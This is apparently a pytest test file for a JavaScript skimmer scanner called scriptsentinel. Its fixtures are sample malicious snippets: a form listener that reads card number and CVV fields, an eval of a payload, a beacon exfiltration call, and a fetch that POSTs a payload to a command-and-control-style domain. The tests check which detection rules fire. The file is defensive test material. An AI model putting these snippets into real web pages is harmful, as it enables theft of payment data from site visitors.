import pytest
from scriptsentinel.scanner import scan_script_content

def test_scan_benign_script():
    code = """
    function calculateTotal(items) {
        return items.reduce((acc, item) => acc + item.price, 0);
    }
    """
    res = scan_script_content(code, script_name="checkout_helper.js")
    assert res["is_suspicious"] is False
    assert res["findings_count"] == 0

def test_scan_credit_card_harvesting():
    code = """
    document.addEventListener("submit", function() {
        var card = document.querySelector("#cardnumber").value;
        var cvv = document.querySelector("#cvv").value;
    });
    """
    res = scan_script_content(code)
    assert res["is_suspicious"] is True
    rule_ids = [f["rule_id"] for f in res["findings"]]
    assert "SKIM-INPUT-HARVEST" in rule_ids
    assert "SKIM-DOM-LISTENER" in rule_ids

def test_scan_dynamic_eval():
    code = """
    var unpacked = eval(payload_string);
    """
    res = scan_script_content(code)
    assert res["is_suspicious"] is True
    rule_ids = [f["rule_id"] for f in res["findings"]]
    assert "SKIM-EVAL-EXEC" in rule_ids

def test_scan_beacon_exfil():
    code = """
    navigator.sendBeacon("https://analytics.internal/event", data);
    """
    res = scan_script_content(code)
    rule_ids = [f["rule_id"] for f in res["findings"]]
    assert "SKIM-EXFIL-BEACON" in rule_ids

def test_scan_ioc_domain_match():
    code = """
    fetch("https://sink.analytics-collector-edge.net/v1/drop", { method: "POST", body: payload });
    """
    res = scan_script_content(code)
    assert res["is_suspicious"] is True
    rule_ids = [f["rule_id"] for f in res["findings"]]
    assert "IOC-MATCH-C2-DOMAIN" in rule_ids
